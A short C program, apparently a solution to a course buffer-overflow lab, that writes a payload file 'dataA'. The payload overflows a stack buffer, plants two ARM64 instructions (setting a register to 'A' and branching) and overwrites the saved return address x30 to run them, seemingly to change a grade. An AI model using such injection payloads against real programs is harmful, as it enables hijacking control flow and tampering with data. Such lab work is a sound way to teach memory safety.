#include <stdio.h>

int main(void)
{
    FILE *psFile;
    unsigned long ulData1;
    unsigned long ulData2;
    unsigned long ulData3;

    ulData1 = 0x42006c; /* address to the instructions below; */
    ulData2 = 0x52800821; /* mov w1, #0x41 */
    ulData3 = 0x17FF81FB; /* b 0x40085c */

    psFile = fopen("dataA", "w");

    /* buf[0 - 17] */
    fprintf(psFile, "Maxwell and Melody");
    /* buf[18] */
    fprintf(psFile, "%c", '\0');
    /* buf[19] */
    fprintf(psFile, "%c", '\0');
    /* buf[20-27] */
    fwrite(&ulData2, sizeof(unsigned long), 1, psFile);
    /* buf[28-35] */
    fwrite(&ulData3, sizeof(unsigned long), 1, psFile);
    /* buf[36-47] */
    fprintf(psFile, "fillerfille");
    /* buf[48-55] (x30) */
    fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
    /* buf[56] (newline in unused memory) */
    fprintf(psFile, "%c", '\n');
    return 0;
}